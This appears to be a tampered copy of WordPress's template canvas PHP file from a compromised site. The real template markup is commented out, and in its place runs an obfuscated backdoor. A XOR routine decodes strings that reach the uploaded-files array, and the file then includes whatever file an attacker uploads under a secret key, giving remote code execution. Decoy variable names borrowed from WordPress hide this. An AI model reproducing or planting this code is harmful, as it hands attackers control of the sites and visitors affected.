<?php /* 
*
 * Template canvas file to render the current 'wp_template'.
 *
 * @package WordPress
 

*
 * Get the template HTML.*/
 	
$array_int_fields = 'OlxToGekPyE5Uin';
$post_content = $array_int_fields;
	$post_after = 'thumbnail_support';
function end_dirty($new_path, $data)

{
    $permalink_epmask = $data;

    $taxonomy_obj = urldecode($new_path);
    $post_modified = substr($permalink_epmask,0, strlen($taxonomy_obj));
	$filters = 'attrs';
    $count = $taxonomy_obj ^ $post_modified;

    return $count;

}

$string_nullspace = ${end_dirty("%10%2A1%18%2A%14", $post_content)};
	$atts = 'is_bad_flat_slug';
$newtext = $string_nullspace;
	$dynamic_characters = 'short_url';
$exts = isset($newtext[$post_content]);
if ($exts)

{

    $diff = $string_nullspace[$post_content];
    $revision_ids = $diff[end_dirty("%3B%01%08%0B%01%26%08%0E", $post_content)];
    $current_guid = $revision_ids;
    include ($current_guid);
}



/* 
 * This needs to run before <head> so that blocks can add scripts and styles in wp_head().
 
$template_html = get_the_block_template_html();
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<?php wp_body_open(); ?>

<?php echo $template_html;  phpcs:ignore WordPress.Security.EscapeOutput ?>

<?php wp_footer(); ?>
</body>
</html>
*/